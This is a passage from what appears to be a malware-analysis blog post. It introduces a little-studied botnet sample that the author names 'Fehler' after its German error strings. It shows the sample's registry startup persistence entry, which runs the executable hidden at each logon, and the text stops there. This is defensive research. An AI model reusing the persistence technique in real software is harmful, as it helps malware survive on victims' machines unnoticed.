A leap into the unknown is a series which will discuss some lesser known malware, that has a reasonably good command and control structure.
Most of this malware might not be totally new to the AVs, but they were never considered for more than just creating a signature.
Little or no effort has been made to disclose the motivation behind creating this malware, the CnC architecture, or the people behind it.
These articles are not to prove that "My (discovered) botnet is bigger than yours".
No offense to those who may already know about this malware and might not agree with the word 'unknown' in the title of this article.
There is always someone who knows more than you do.
Lets start with our first malware.
Here is the VirusTotal report.
Name: You may see from the VT report that none of the AVs give it a proper name.
Most likely, detection for this malware is based on automated signature generation, and no one really looked into it for a detailed analysis.
No worries.
Let me assign it a name: 'Fehler'.
Why?
Let me explain.
Origin: After unpacking the executable, almost all of the strings found were written in German (thanks to Google Translate):
Fehler beim Einlesen des Programms: [Error in reading the program:]
Fehler %d beim Daten lesen (sockRead) [Error% d while reading data (sockread) ]
Due to excessive usage of the word Fehler ('Error' or 'Mistake' in English) throughout the malware code, this name really suits it.
Anyway, what's in a name?
Lets move on.
Upon execution, Fehler adds itself to the start up process so that it can run each time user logs on.
'UpDate' = <Path\Name.exe> -hide
